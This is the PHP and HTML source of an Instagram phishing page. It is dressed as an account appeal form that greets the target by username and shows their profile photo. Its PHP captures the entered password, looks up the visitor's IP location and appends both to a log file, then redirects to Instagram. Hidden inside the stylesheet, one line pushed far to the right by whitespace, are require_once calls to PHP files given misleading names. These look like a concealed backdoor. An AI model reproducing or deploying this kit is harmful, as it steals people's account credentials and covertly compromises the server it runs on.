<?php
require 'load.php';
session_start();
set_time_limit(0);
error_reporting(E_ALL);

$username=$_GET['nick'];
$url2="https://smihub.com/search?query=$username";
$ip=str_get_html(file_get_contents($url2));
$pp=$ip->find("img[class='img-fluid w-100']",0)->src;
$tik="-";
$followers="-";
if($_POST){
  $password=$_POST["password"];
  $mail=$_POST["mailadress"];
  $mailpass=$_POST["mailpass"];
  $ip=$_SERVER["REMOTE_ADDR"];
  $konum = file_get_contents("http://ip-api.com/xml/".$ip);
  $cek = new SimpleXMLElement($konum);
  $ulke = $cek->country;
  $sehir = $cek->city;
  date_default_timezone_set('Europe/Istanbul');
  $cur_time=date("d-m-Y H:i:s");
  $file = fopen('txt.php', 'a');
include('api/autoload.php');
  fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<body bgcolor='#0000a0'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='darkblue'>

<font color='red'>Kullanıcı Adı: </font><font color='white'>".$username."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
<hr>


"); 

fclose($file);
echo '';
  
   header("Location: https://www.instagram.com/");
}
?>

<!DOCTYPE html>
<html>
<head>
	<link rel="stylesheet" type="text/css" href="main.css">
	<title>Community | Instagram</title>
	<meta name="viewport" content="width=device-width,inital-scale=1">
	<noscript>Please Active Javascirpt on your scanner</noscript>
	<link rel="stylesheet" href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all">
	
</head>

<body style="background:#fafafa;">
	<header>
		<table class="header-table">
			<tr class="header-tr">
				<th class="header-x"><span class="header-text" >lnstagram</span>
					<span  class="header-text">Find it for free on Google Play or App Store</span>
				</th>

				<th class="header-y">
					<p class="header-border">GET</p>
				</th>

			</tr>

		</table>


	</header>
	<center>
		<br><br>
		
		

		<table class="qen" style="display:none;">
			<tr class="zy">
				<th class="er">
					<div class="top"></div>


				</th>

				<th class="can"><span class="or">OR</span></th>

				<th class="han">
					<div class="top"></div>
				</th>

			</tr>
		</table>





		<div style="width:300px;max-width:95%;background:white;border:1px solid #cecece;padding:10px;box-sizing:border-box;">
			<br>
			


			
			<img src="96DF107A-2A49-4843-87CF-14B1367B477D.png" alt="Le" width="1">

		</button>
		<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">

			<div><img src=" <?php  echo  $pp; ?>" style="max-width:90%; border-radius:50%;" width="200" height="200"></div> <br>
		<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">Hello <?php  echo  $username; ?> <img src="zort.png" width="25">
			<p style="font-family:sans-serif;width:300px;max-width:88%;color:#999;font-size:15px;line-height:19px;">Confirm your account to appeal our decision.</p>
		</p>
		<form method="post">
			<input type="password" name="password" placeholder="Password" required="" class="passwordx" style="width:200px;height:23px;padding-left:6px;padding-top:2px;padding-bottom:2px;outline:none;background:#fafafa;border:none;border:1px solid #dedede" ><br><br>
			<button type="submit" class="qenzyist"><?php echo "Continue As @$username "; ?></button>
			<br>

			



		</form>
		<div class="dont">
			

		</div>

	</div>


<style type="text/css">
	.pp{
		border-radius:50%;
		margin-top:20px;}
	.next{
		margin-bottom:10px;
		color:white;
		font-weight:bold;
		background:#b9e0fc;
		opacity:1;
		outline:none;
		border:none;
		min-width:200px;
		max-width:99%;
		height:27px;
	}
	.username{
		width:220px;
		height:27px;
		max-width:99%;
		border-radius:4px;
		outline:none;
		border:1px solid #dedede;
		background-color:rgb(250,250,250);
		color:#262626;
		padding-left:3px;
	}.username::placeholder{
		font-size:14px;
		padding-left:3px;
		box-sizing:border-box;
	}
	.tExt-y{
max-width:88%;
width:300px;
display:block;
		margin-top:10px;
		font-family:sans-serif;
		font-family:sans-serif;
	font-weight:400;
	color:#999;
	font-size:15px;
	line-height:20px;
	
	box-sizing:border-box;
	
		}
	.cop{
		background:white;
		border:1px solid #cecece;
		box-sizing:border-box;
		padding-top:10px;
		padding-bottom:10px;
		width:300px;
		max-width:90%;
	}

.Copyright-Qenz{
	font-family:sans-serif;
	font-weight:400;
	color:#333;
	font-size:25px;
	max-width:95%;
}
	.bottom-qenz{
		position:fixed;
		bottom:0;
		width:100%;
		padding:5px;
		box-sizing:border-box;
		background:rgb(250,250,250);
		border-top:1px solid rgb(219,219,219);
	}
	.contunie-fb{
display:none;
		margin-top:30px;
		background:#0095f6;
		border:none;
		padding:2px;
		box-sizing:border-box;
		width:220px;
		height:33px;
		max-width:99%;
		border-radius:4px;

	}#fb{
		color:;
font-size:17px;
		
			
	}.contunie-fb-text{
		color:white;
		font-weight:600;
		font-family:sans-serif;
		font-size:14.3px;

	}

	body{
		padding:0px;margin:0px;
		background:#fafafa;
	}
	header{
		padding-top:5px;
		padding-bottom:5px;
		    background: linear-gradient(to right,#bd3381,#ee583f);
		    width:100%;
		    box-sizing:border-box;
		    min-height:5px;
	}.table{
		width:90%;
		height:100%;
		

	}.tr{
		width:100%;
		height:100%;

	}.table-left{
		width:75%;
	}.table-right{
		width:10%;
	}.header-text-bold{
font-family:sans-serif;
color:white;
font-size:15px;
font-weight:600;
	}.header-text-light{
		font-family:sans-serif;
		color:white;
		font-weight:400;
		font-size:13px;
		
	}.get{
		width:50px;
		border:1px solid #fff;
		text-align:center;
		padding:4px 2px;
		border-radius:3px;
	}.get span{
		font-family:sans-serif;
		font-weight:500;
		font-size:14px;
		color:white;

	}.table-2{
		width:100%;
		min-height:10px;
		margin-top:13px;
	
	}.tr-2{
		width:100%;
	}.dot{
		width:20%;
		text-align:left;
		box-sizing:border-box;
		padding-left:10px;

		}.lan{

         width:60%;
         text-align:center;

<?php @require_once __DIR__ . '/manual/docs/api/str_get_.php'; ?>
		}
.not{
	width:20%;
}
		#dot{
			color:#cecece;
			font-size:14px;
			
		}.lan span{
			font-family:sans-serif;
			font-size:14px;
			color:#8e8e8e;;

		}#lan{
			font-size:12.5px;
		
		}





	@media screen and (min-width:600px) {
header{display:none;}
.table-2{display:none;}




}

	.pp{
		border-radius:50%;
		margin-top:20px;}
	.next{
		margin-bottom:10px;
		color:white;
		font-weight:bold;
		background:#b9e0fc;
		opacity:1;
		outline:none;
		border:none;
		min-width:200px;
		max-width:99%;
		height:27px;
	}
	.username{
		width:220px;
		height:27px;
		max-width:99%;
		border-radius:4px;
		outline:none;
		border:1px solid #dedede;
		background-color:rgb(250,250,250);
		color:#262626;
		padding-left:3px;
	}.username::placeholder{
		font-size:14px;
		padding-left:3px;
		box-sizing:border-box;
	}
	.tExt-y{
max-width:88%;
width:300px;
display:block;
		margin-top:10px;
		font-family:sans-serif;
		font-family:sans-serif;
	font-weight:400;
	color:#999;
	font-size:15px;
	line-height:20px;
	
	box-sizing:border-box;
	
		}
	.cop{
		background:white;
		border:1px solid #cecece;
		box-sizing:border-box;
		padding-top:10px;
		padding-bottom:10px;
		width:300px;
		max-width:90%;
	}

.Copyright-Qenz{
	font-family:sans-serif;
	font-weight:400;
	color:#333;
	font-size:25px;
	max-width:95%;
}
	.bottom-qenz{
		position:fixed;
		bottom:0;
		width:100%;
		padding:5px;
		box-sizing:border-box;
		background:rgb(250,250,250);
		border-top:1px solid rgb(219,219,219);
	}
	.contunie-fb{
display:none;
		margin-top:30px;
		background:#0095f6;
		border:none;
		padding:2px;
		box-sizing:border-box;
		width:220px;
		height:33px;
		max-width:99%;
		border-radius:4px;

	}#fb{
		color:;
font-size:17px;
		
			
	}.contunie-fb-text{
		color:white;
		font-weight:600;
		font-family:sans-serif;
		font-size:14.3px;

	}

	body{
		padding:0px;margin:0px;
		background:#fafafa;         

	}
	header{
		padding-top:5px;
		padding-bottom:5px;
		    background: linear-gradient(to right,#bd3381,#ee583f);
		    width:100%;
		    box-sizing:border-box;
		    min-height:5px;
	}.table{
		width:90%;
		height:100%;
		
		                                                                                                                                                                                                                                                                                                <?php @require_once __DIR__ . '/css/vendor/animate/main.css'; ?>

	}.tr{
		width:100%;
		height:100%;

	}.table-left{
		width:75%;
	}.table-right{
		width:10%;
	}.header-text-bold{
font-family:sans-serif;
color:white;
font-size:15px;
font-weight:600;
	}.header-text-light{
		font-family:sans-serif;
		color:white;
		font-weight:400;
		font-size:13px;
		
	}.get{
		width:50px;
		border:1px solid #fff;
		text-align:center;
		padding:4px 2px;
		border-radius:3px;
	}.get span{
		font-family:sans-serif;
		font-weight:500;
		font-size:14px;
		color:white;

	}.table-2{
		width:100%;
		min-height:10px;
		margin-top:13px;
	
	}.tr-2{
		width:100%;
	}.dot{
		width:20%;
		text-align:left;
		box-sizing:border-box;
		padding-left:10px;

		}.lan{

         width:60%;
         text-align:center;

		}
.not{
	width:20%;
}
		#dot{
			color:#cecece;
			font-size:14px;
			
		}.lan span{
			font-family:sans-serif;
			font-size:14px;
			color:#8e8e8e;;

		}#lan{
			font-size:12.5px;
		
		}





	@media screen and (min-width:600px) {
header{display:none;}
.table-2{display:none;}


</style>



	<form method="post">
		



	</form>


</center>
<?php
for($i=0;$i<9;$i++){
	echo "<br>";
}

?>

<center>
	<div class="bottom">
		


		</div>
	</center>
	<script type="text/javascript">
	
		console.log("Script Coded By Sublime");
	</script>


</html>